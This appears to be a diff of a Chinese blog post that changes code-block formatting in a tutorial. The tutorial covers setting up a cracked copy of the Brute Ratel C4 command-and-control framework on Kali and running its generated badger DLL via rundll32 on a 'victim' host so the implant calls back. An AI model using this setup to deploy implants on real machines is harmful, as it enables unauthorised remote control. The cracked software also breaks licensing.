@@ -16,9 +16,11 @@ Brute Ratel C4是一款类似于Cobalt Strike的商业红队武器框架，每�
 
 在kali中进行安装。首先对压缩包进行解压。
 
-```bash
+::: code-group
+```bash [bash]
 kali :: ~/Desktop/BRC4 » unzip BRC4.zip
 ```
+:::
 
 得到如下文件：
 
@@ -26,31 +28,37 @@ kali :: ~/Desktop/BRC4 » unzip BRC4.zip
 
 给予`brute-ratel-linx64_crack` 和 `lib64/commander` 执行权限
 
-```bash
+
+::: code-group
+```bash [bash]
 kali :: ~/Desktop/BRC4 » chmod +x x brute-ratel-linx64_crack                                   1 ↵
 kali :: ~/Desktop/BRC4 » chmod +x lib64/commander                                            130 ↵
 ```
+:::
 
 启动服务端，其中用户名为`hack`，密码为`p@ssw0d`，端口为`7788`，可以自行调整。
-
-```bash
+:::code-group
+```bash [bash]
 kali :: ~/Desktop/BRC4 » ../brute-ratel-linx64_crack -ratel -a hack -p p@ssw0d -h 127.0.0.1:7788 -sc
  cert.pem -sk key.pem
 ```
+:::
 
 ![CleanShot 2024-08-17 at 00.32.05@2x.png](https://takuya-1305710862.cos.ap-shanghai.myqcloud.com/A1ways0nline/picCleanShot%202024-08-17%20at%2000.32.05@2x.png)
 
 接下来打开图形界面，首先赋予执行权限
-
-```bash
+:::code-group
+```bash [bash]
 kali :: ~/Desktop/BRC4 » chmod +x Rungui.sh
 ```
+:::
 
 启动图形界面
-
-```bash
+:::code-group
+```bash [bash]
 kali :: ~/Desktop/BRC4 » ./Rungui.sh                                                    130 ↵
 ```
+:::
 
 启动了图形界面后，接下来输入前面设定好的用户名和密码，点击猴子就可以成功登录。
 
@@ -92,10 +100,11 @@ kali :: ~/Desktop/BRC4 » ./Rungui.sh                                           
 ![image.png](https://takuya-1305710862.cos.ap-shanghai.myqcloud.com/A1ways0nline/pic/20240817010536.png)
 
 将这个DLL放到受害者的主机上，为了方便测试，直接在cmd终端执行命令：
-
-```powershell
+:::code-group
+```powershell [powershell]
 rundll32 badger_x64.dll,main
 ```
+:::
 
 可以看到，成功上线了。
 
